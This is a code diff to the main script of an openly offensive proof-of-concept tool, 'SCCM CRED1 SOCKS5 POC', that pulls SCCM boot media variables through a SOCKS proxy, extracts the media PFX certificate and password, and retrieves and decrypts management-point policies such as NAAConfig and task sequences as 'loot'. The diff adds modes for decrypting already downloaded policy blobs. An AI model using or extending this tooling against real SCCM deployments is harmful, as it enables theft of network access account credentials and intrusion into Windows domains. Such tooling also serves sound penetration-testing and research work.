@@ -1,9 +1,8 @@
-from lib import sccm
-from lib import socks, tftp
 from lib.policy import PolicyRetriever
 import argparse
 import binascii
 import os
+import xml.etree.ElementTree as ET
 
 # Parse arguments
 parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
@@ -34,6 +33,28 @@ policies_parser = subparsers.add_parser("policies", help="Retrieve policies from
 policies_parser.add_argument("xml_file", help="Path to decrypted media variables XML or loot_summary.txt")
 policies_parser.add_argument("-o", "--output", help="Output directory for policy files", type=str, default="./loot")
 policies_parser.add_argument("--mp", help="Override management point URL", type=str, default=None)
+policies_parser.add_argument(
+    "--fallback-local",
+    help="After remote retrieval, also process local .raw blobs as fallback",
+    action="store_true",
+)
+policies_parser.add_argument(
+    "--fallback-input",
+    help="Input dir for fallback .raw blobs (default: --output dir)",
+    type=str,
+    default=None,
+)
+
+# Local policies mode — decrypt already downloaded .raw policy blobs
+policies_local_parser = subparsers.add_parser(
+    "policies-local",
+    help="Decrypt local policy .raw blobs using PFX from media XML",
+)
+policies_local_parser.add_argument("xml_file", help="Path to decrypted media variables XML or loot_summary.txt")
+policies_local_parser.add_argument(
+    "-i", "--input", help="Directory containing NAAConfig.raw/TaskSequence_*.raw", type=str, default="./loot"
+)
+policies_local_parser.add_argument("-o", "--output", help="Output directory for decrypted policy files", type=str, default="./loot")
 
 args = parser.parse_args()
 
@@ -54,15 +75,15 @@ def handle_decrypted_xml(sccm_client, decrypted_xml, output_dir):
     print("[*] Extracting loot from decrypted media variables...")
     sccm_client.extract_media_variables(decrypted_xml, output_dir)
 
-if args.mode == "policies":
-    # Retrieve policies from MP using PFX from decrypted XML
-    import xml.etree.ElementTree as ET
-
+if args.mode in ("policies", "policies-local"):
+    # Retrieve/decrypt policies using PFX from decrypted media variables XML
     with open(args.xml_file, "r") as f:
         xml_text = f.read()
 
     root = ET.fromstring(xml_text.encode("utf-16-le"))
-    mp_url = args.mp or root.find('.//var[@name="SMSTSMP"]').text
+    mp_url = root.find('.//var[@name="SMSTSMP"]').text
+    if args.mode == "policies" and args.mp:
+        mp_url = args.mp
     site_code = root.find('.//var[@name="_SMSTSSiteCode"]').text
     media_guid = root.find('.//var[@name="_SMSMediaGuid"]').text
     pfx_hex = root.find('.//var[@name="_SMSTSMediaPFX"]').text
@@ -75,11 +96,21 @@ if args.mode == "policies":
     print(f"[*] PFX Password: {pfx_password}")
 
     retriever = PolicyRetriever(mp_url, site_code, pfx_bytes, pfx_password)
-    retriever.retrieve_policies(media_guid, args.output)
+    if args.mode == "policies":
+        retriever.retrieve_policies(media_guid, args.output)
+        if args.fallback_local:
+            fallback_input = args.fallback_input or args.output
+            print(f"[*] Running local fallback from {os.path.abspath(fallback_input)}")
+            retriever.process_local_policy_blobs(fallback_input, args.output)
+    else:
+        print(f"[*] Input directory: {os.path.abspath(args.input)}")
+        retriever.process_local_policy_blobs(args.input, args.output)
     exit()
 
 if args.mode == "loot":
     # Extract from already-decrypted XML
+    from lib import sccm
+
     sccm_client = sccm.SCCM(None, None, None)
     with open(args.xml_file, "r") as f:
         xml_text = f.read()
@@ -88,6 +119,8 @@ if args.mode == "loot":
 
 if args.mode == "decrypt":
     # Decrypt a local file with the given key
+    from lib import sccm
+
     sccm_client = sccm.SCCM(None, None, None)
     try:
         with open(args.file, "rb") as f:
@@ -106,6 +139,10 @@ if args.mode == "decrypt":
 if args.target == None or args.socks_host == None or args.socks_port == None or args.src_ip == None:
     print("Usage: python3 main.py <target> <src_ip> <socks_host> <socks_port>")
     exit()
+
+# Attack-only imports (scapy-dependent)
+from lib import sccm
+from lib import socks, tftp
 
 # Setup SOCKS5 client
 client = socks.SOCKS5Client(args.socks_host, args.socks_port)
